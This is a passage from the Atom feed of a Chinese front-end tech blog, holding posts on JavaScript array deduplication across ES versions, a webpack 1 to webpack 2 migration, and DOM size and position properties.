不成立），它应该属于一种独特的去重方式<br>往往我们对这种去重方式还是不满意，因为它把数字 1 和字符串 1 也给合并了，我们可以稍微修改一下，在 key 里面同时加上类型：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NaN</span>, <span class="string">'1'</span>, <span class="string">''</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">NaN</span>];</span><br><span class="line"><span class="built_in">Array</span>.prototype.uniq = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [], map = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.length; i++) &#123;</span><br><span class="line">    map[<span class="keyword">typeof</span> <span class="keyword">this</span>[i] + <span class="keyword">this</span>[i]] = <span class="keyword">this</span>[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> map) &#123;</span><br><span class="line">    result.push(map[key]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(array.uniq());</span><br><span class="line"><span class="comment">// 输出结果 [1, 0, NaN,"1","", true, false]</span></span><br></pre></td></tr></table></figure></p><p>这样子基本上就算是实现了我们预期的目标了，同时支持了去除 NaN 的功能</p><h3 id="三、借助-ECMAScript-5-的新特性进行简写"><a href="#三、借助-ECMAScript-5-的新特性进行简写" class="headerlink" title="三、借助 ECMAScript 5 的新特性进行简写"></a>三、借助 ECMAScript 5 的新特性进行简写</h3><p>上面的写法在发展到 ES5 以后有了更简便的写法，可以借助过滤函数 filter 进行优化：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NaN</span>, <span class="string">'1'</span>, <span class="string">''</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">NaN</span>];</span><br><span class="line"><span class="built_in">Array</span>.prototype.uniq = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> map = &#123;&#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.filter(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> key = <span class="keyword">typeof</span> item + item;</span><br><span class="line">    <span class="keyword">return</span> map.hasOwnProperty(key) ? <span class="literal">false</span> : (map[key] = <span class="literal">true</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(array.uniq());</span><br><span class="line"><span class="comment">// 输出结果 [1, 0, NaN,"1","", true, false]</span></span><br></pre></td></tr></table></figure></p><h3 id="四、借助-ECMAScript-6-的新特性进行简写"><a href="#四、借助-ECMAScript-6-的新特性进行简写" class="headerlink" title="四、借助 ECMAScript 6 的新特性进行简写"></a>四、借助 ECMAScript 6 的新特性进行简写</h3><p>到了 ES6 还有更简便的写法，第一种是借助 Map 对象和箭头函数语法糖：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NaN</span>, <span class="string">'1'</span>, <span class="string">''</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">NaN</span>];</span><br><span class="line"><span class="built_in">Array</span>.prototype.uniq = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> seen = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.filter(<span class="function"><span class="params">a</span> =&gt;</span> !seen.has(a) &amp;&amp; seen.set(a, <span class="literal">true</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(array.uniq());</span><br><span class="line"><span class="comment">// 输出结果 [1, 0, NaN,"1","", true, false]</span></span><br></pre></td></tr></table></figure></p><p>第二种是直接借助 Set：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="literal">NaN</span>, <span class="string">'1'</span>, <span class="string">''</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">NaN</span>];</span><br><span class="line"><span class="built_in">Array</span>.prototype.uniq = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="keyword">new</span> <span class="built_in">Set</span>(<span class="keyword">this</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(array.uniq());</span><br><span class="line"><span class="comment">// 输出结果 [1, 0, NaN,"1","", true, false]</span></span><br></pre></td></tr></table></figure></p><p>可见，发展到 ES6 之后，已经可以一行就实现数组去重了<br>不由得感叹一下，标准的发展使得生产真是越来越便利了！</p><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><blockquote><p><a href="http://stackoverflow.com/questions/9229645/remove-duplicates-from-javascript-array" rel="external nofollow noopener noreferrer" target="_blank">Remove Duplicates from JavaScript Array</a><br><a href="https://www.zhihu.com/question/29558082" rel="external nofollow noopener noreferrer" target="_blank">求一个 javascript 数组去重方法？</a><br><a href="https://www.toobug.net/article/array_unique_in_javascript.html" rel="external nofollow noopener noreferrer" target="_blank">也谈 JavaScript 数组去重</a><br><a href="https://github.com/hanzichi/underscore-analysis/issues/9" rel="external nofollow noopener noreferrer" target="_blank">JavaScript 数组去重</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;说到 javascript 数据去重，估计所有做前端的都并不陌生&lt;br&gt;数组去重的算法即使在实际生产中不一定用的多，但是在面试中几乎成为了必考的题目&lt;br&gt;这是一个神奇的题目，看上去好像是死的，应该已经没有什么发挥空间了&lt;br&gt;但事实上它随着 ECMAScript 标准的发展，数据去重的实现反倒是在不断变化&lt;br&gt;许多公司甚至可以单从一个数组去重直接看出一个前端工程师的大致水平&lt;br&gt;今天我也来说说我所知道的 javascript 数组去重吧&lt;/p&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>从 webpack 1 到 webpack 2 的迁移记</title>
    <link href="https://hexo.bangz.me/archives/migrating-config-to-webpack-2.html"/>
    <id>https://hexo.bangz.me/archives/migrating-config-to-webpack-2.html</id>
    <published>2017-02-14T00:42:00.000Z</published>
    <updated>2018-06-08T09:49:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近上手新项目的时候想要用个 sass，结果发现 npm 里面的 sass-loader 默认的 peerDependencies 中的 webpack 版本被升级到了 2<br>当时没想太多，就装了个 webpack 2.2.1 来用，结果发现以前项目的 webpack 配置居然不能够直接用！一跑起来一还堆错<br>上网查了下，才知道 webpack 2 弄了很多 breaking changes ，想着反正这些问题迟早要解决的，于是就开始了我的 webpack 2 踩坑过程</p><a id="more"></a><h3 id="1、以前那种省略-‘-loader’-的写法不能直接用了"><a href="#1、以前那种省略-‘-loader’-的写法不能直接用了" class="headerlink" title="1、以前那种省略 ‘-loader’ 的写法不能直接用了"></a>1、以前那种省略 ‘-loader’ 的写法不能直接用了</h3><p>具体信息参考 <a href="https://github.com/webpack/webpack/releases/tag/v2.1.0-beta.26" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/webpack/webpack/releases/tag/v2.1.0-beta.26</a><br>如果还是要用以前的这种省略式的写法，需要在 webpack 的配置文件中添加一条配置项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resolveLoader: &#123;moduleExtensions : [&apos;-loader&apos;]&#125;</span><br></pre></td></tr></table></figure></p><h3 id="2、相关插件都要对应的进行升级"><a href="#2、相关插件都要对应的进行升级" class="headerlink" title="2、相关插件都要对应的进行升级"></a>2、相关插件都要对应的进行升级</h3><p>webpack 2 和旧版本的 extract-text-webpack-plugin 似乎不兼容<br>如果要 extract-text-webpack-plugin，则 extract-text-webpack-plugin 的版本也要升到 2.0 以上<br>截至写这篇文章为止，extract-text-webpack-plugin 的最新版本是 2.0.0-rc.3，可以直接复制下面的命令安装<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install extract-text-webpack-plugin@<span class="number">2.0</span><span class="number">.0</span>-rc<span class="number">.3</span> --save-dev</span><br></pre></td></tr></table></figure></p><p>注：如果安装了旧版本的 extract-text-webpack-plugin，需要先卸载旧版，再安装新版<br>webpack-dev-server 也是一样，需要安装 2.0 或更高版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install webpack-dev-server@latest --save-dev</span><br></pre></td></tr></table></figure></p><h3 id="3、extract-text-webpack-plugin-中-extract-方法的参数需要修改"><a href="#3、extract-text-webpack-plugin-中-extract-方法的参数需要修改" class="headerlink" title="3、extract-text-webpack-plugin 中 extract 方法的参数需要修改"></a>3、extract-text-webpack-plugin 中 extract 方法的参数需要修改</h3><p>比如之前需要合成 sass 的话，直接这样配置就可以了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test: <span class="regexp">/\.scss/</span>,</span><br><span class="line">loader: ExtractTextPlugin.extract(<span class="string">'style-loader'</span>, <span class="string">'css-loader'</span>,<span class="string">'sass-loader'</span>)</span><br></pre></td></tr></table></figure></p><p>当时的参数形式是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractTextPlugin.extract([notExtractLoader], loader, [options])</span><br></pre></td></tr></table></figure></p><p>接着换成新的参数形式是这样的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractTextPlugin.extract(&#123;[fallback], use, [publicPath]&#125;)</span><br></pre></td></tr></table></figure></p><p>其中参数形式变成了对象，不再是原来那样直接传字符串，接着 notExtractLoader 改了个名字叫 fallback（之前还叫过 fallbackLoader），loader 改名成了 use<br>所以上面那个例子转换过来之后的形式是这个样子的：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test: <span class="regexp">/\.scss/</span>,</span><br><span class="line">loader: ExtractTextPlugin.extract(&#123;</span><br><span class="line">      fallback: <span class="string">"style-loader"</span>,</span><br><span class="line">      use: [<span class="string">"css-loader"</span>, <span class="string">"sass-loader"</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>还好我这边的配置不是很多，所以改动量就只有这么大<br>不过理解起来还是稍微废了点劲，写出来之后就明白多了</p><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><blockquote><p><a href="https://github.com/webpack-contrib/extract-text-webpack-plugin/blob/webpack-1/README.md" rel="external nofollow noopener noreferrer" target="_blank">Webpack 1 ReadMe</a><br><a href="https://github.com/webpack-contrib/extract-text-webpack-plugin/blob/master/README.md" rel="external nofollow noopener noreferrer" target="_blank">Webpack 2 ReadMe</a><br><a href="https://webpack.js.org/guides/migrating/" rel="external nofollow noopener noreferrer" target="_blank">Migrating from v1 to v2</a><br><a href="http://javascriptplayground.com/blog/2016/10/moving-to-webpack-2/" rel="external nofollow noopener noreferrer" target="_blank">Migrating to Webpack 2</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近上手新项目的时候想要用个 sass，结果发现 npm 里面的 sass-loader 默认的 peerDependencies 中的 webpack 版本被升级到了 2&lt;br&gt;当时没想太多，就装了个 webpack 2.2.1 来用，结果发现以前项目的 webpack 配置居然不能够直接用！一跑起来一还堆错&lt;br&gt;上网查了下，才知道 webpack 2 弄了很多 breaking changes ，想着反正这些问题迟早要解决的，于是就开始了我的 webpack 2 踩坑过程&lt;/p&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
      <category term="前端" scheme="https://hexo.bangz.me/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="webpack" scheme="https://hexo.bangz.me/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>原生 js 中的各种宽高以及位置的获取</title>
    <link href="https://hexo.bangz.me/archives/getting-size-and-position-attributes-with-javascript.html"/>
    <id>https://hexo.bangz.me/archives/getting-size-and-position-attributes-with-javascript.html</id>
    <published>2016-11-06T22:44:00.000Z</published>
    <updated>2018-06-08T10:26:51.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近在用原生的 js 来实现一些交互特效，写的时候发现这些宽度和高度的获取真的是太常用了<br>而且获取他们的方法不止一个两个，上网一搜发现有好多，看得我眼花缭乱的<br>于是我自己做了一个归纳，方便以后快速查阅</p><p>对于移动端，一般要统一初始化视口宽高缩放比例<br><a id="more"></a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>### </p><p>## </p><h2 id="一、全局类的宽高获取："><a href="#一、全局类的宽高获取：" class="headerlink" title="一、全局类的宽高获取："></a>一、全局类的宽高获取：</h2><p>屏幕分辨率宽度和高度的获取：</p><ul><li>宽度：window.screen.width</li><li>高度：window.screen.height</li></ul><p>屏幕可用工作区宽度和高度的获取：</p><ul><li>宽度：window.screen.availWidth</li><li>高度：window.screen.availHeight</li></ul><p>浏览器应用程序窗口宽度和高度的获取（整个浏览器程序）：</p><ul><li>宽度：window.outerWidth</li><li>高度：window.outerHeight</li></ul><p>浏览器视口宽度和高度的获取（包括滚动条）：</p><ul><li>宽度：window.innerWidth</li><li>高度：window.innerHeight</li></ul><p>浏览器视口宽度和高度的获取（不包括滚动条）：</p><ul><li>宽度：document.documentElement.clientWidth</li><li>高度：document.documentElement.clientHeight</li></ul><p>文档实际内容宽度和高度的获取：</p><ul><li>宽度：document.body.clientWidth</li><li>高度：document.body.clientHeight</li></ul><h2 id="二、DOM-元素宽度和高度的获取"><a href="#二、DOM-元素宽度和高度的获取" class="headerlink" title="二、DOM 元素宽度和高度的获取"></a>二、DOM 元素宽度和高度的获取</h2><p>对于每个 DOM 元素，均有 6 个获取它们的宽高的方法</p><ul><li>offsetWidth, offsetHeight: 分别负责获取 DOM 元素的宽度和高度，包括所有 border 和 padding</li><li>clientWidth, clientHeight: 分别负责获取 DOM 元素的宽度和高度，不包括 border 和滚动条，但包括 padding</li><li>scrollWidth, scrollHeight: 分别负责获取 DOM 元素的宽度和高度，如果有滚动条的话，会包括那些暂时在滚动区外不可见的内容。</li></ul><h3 id="具体情况如下图："><a href="#具体情况如下图：" class="headerlink" title="具体情况如下图："></a>具体情况如下图：</h3><p><img src="/images/tp_old/2016/11/3925978503.png" alt=""></p><h2 id="三、DOM-元素位置的获取："><a href="#三、DOM-元素位置的获取：" class="headerlink" title="三、DOM 元素位置的获取："></a>三、DOM 元素位置的获取：</h2><ul><li>offsetTop, offsetLeft：分别负责获取元素相对于父元素的上偏移和左偏移</li><li>scrollTop, scrollLeft：分别负责获取元素相对于父元素的上滚动距离和左滚动距离</li><li>clientTop, clientLeft：分别负责获取元素的上、左两个 border 的厚度（这个其实不是获取元素位置的，之所以摆出来，是因为它容易跟前面两个混淆）</li></ul><h3 id="具体情况如下图：-1"><a href="#具体情况如下图：-1" class="headerlink" title="具体情况如下图："></a>具体情况如下图：</h3><p><img src="/images/tp_old/2016/11/1803871656.jpg" alt="201211040853289748.jpg"></p><p>下面还有一张更加清晰的图：<br><img src="/images/tp_old/2016/11/1615605127.png" alt=""></p><h2 id="四、通过-getBoundingClientRect-获取元素位置和大小"><a href="#四、通过-getBoundingClientRect-获取元素位置和大小" class="headerlink" title="四、通过 getBoundingClientRect 获取元素位置和大小"></a>四、通过 getBoundingClientRect 获取元素位置和大小</h2><p>除了以上两种方法，目前在 js 中还有另一种方法也可以比较好的获取 DOM 元素的位置和大小，就是通过 getBoundingClientRect 方法来获取<br>该方法会返回一个 DOMRect 对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var rect = dom.getBoundingClientRect();</span><br></pre></td></tr></table></figure></p><p>然后通过该对象，可以获得以下属性：</p><ul><li>rect.width 元素宽度</li><li>rect.height    元素高度</li><li>rect.left    元素左边相对于视口原点的横向 X 轴距离</li><li>rect.right 元素右边相对于视口原点的横向 X 轴距离</li><li>rect.top 元素顶部相对于视口原点的纵向 Y 轴距离</li><li>rect.bottom    元素底部相对于视口原点的纵向 Y 轴距离</li></ul><h3 id="具体情况如下图：-2"><a href="#具体情况如下图：-2" class="headerlink" title="具体情况如下图："></a>具体情况如下图：</h3><p><img src="/images/tp_old/2016/11/1821516993.png" alt=""></p><h2 id="五、浏览器当前滚动位置的获取："><a href="#五、浏览器当前滚动位置的获取：" class="headerlink" title="五、浏览器当前滚动位置的获取："></a>五、浏览器当前滚动位置的获取：</h2><ul><li>window.pageXoffset：获取当前浏览器横向滚动条的位置</li><li>window.pageYoffset：获取当前浏览器纵向滚动条的位置</li><li>window.scrollX：同 pageXoffset，是 pageXoffset 的别名</li><li>window.scrollY：同 pageYoffset，是 pageYoffset 的别名</li></ul><p>注：在 IE9 以前，不支持该方法，适用于 IE8 及更早版本的 IE 浏览器的方法如下：</p><ul><li>document.documentElement.scrollTop：获取当前浏览器垂直滚动条的位置</li><li>document.documentElement.scrollLeft：获取当前浏览器水平滚动条的位置</li></ul><h2 id="六、鼠标位置的获取："><a href="#六、鼠标位置的获取：" class="headerlink" title="六、鼠标位置的获取："></a>六、鼠标位置的获取：</h2><ul><li>offsetX, offsetY：获取鼠标当前位置相对于当前焦点元素的横向 X 轴距离和纵向 Y 轴距离</li><li>clientX, clientY：获取鼠标当前位置相对于浏览器视口原点的横向 X 轴距离和纵向 Y 轴距离</li><li>pageX, pageY：获取鼠标当前位置相对于浏览器页面文档流原点的横向 X 轴距离和纵向 Y 轴距离</li><li>screenX, screenY：获取鼠标当前位置相对于屏幕原点的横向 X 轴距离和纵向 Y 轴距离</li></ul><h3 id="具体情况如下图：-3"><a href="#具体情况如下图：-3" class="headerlink" title="具体情况如下图："></a>具体情况如下图：</h3><p><img src="/images/tp_old/2016/11/842096073.jpg" alt=""></p><p>下面这张图更好的阐释了 pageX 和 pageY：<br><img src="/images/tp_old/2016/11/3990403351.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在用原生的 js 来实现一些交互特效，写的时候发现这些宽度和高度的获取真的是太常用了&lt;br&gt;而且获取他们的方法不止一个两个，上网一搜发现有好多，看得我眼花缭乱的&lt;br&gt;于是我自己做了一个归纳，方便以后快速查阅&lt;/p&gt;
&lt;p&gt;对于移动端，一般要统一初始化视口宽高缩放比例&lt;br&gt;
    
    </summary>
    
      <category term="技术研究" scheme="https://hexo.bangz.me/categories/%E6%8A%80%E6%9C%AF%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="javascript" scheme="https://hexo.bangz.me/tags/javascript/"/>
    
  </entry>
  
</feed>
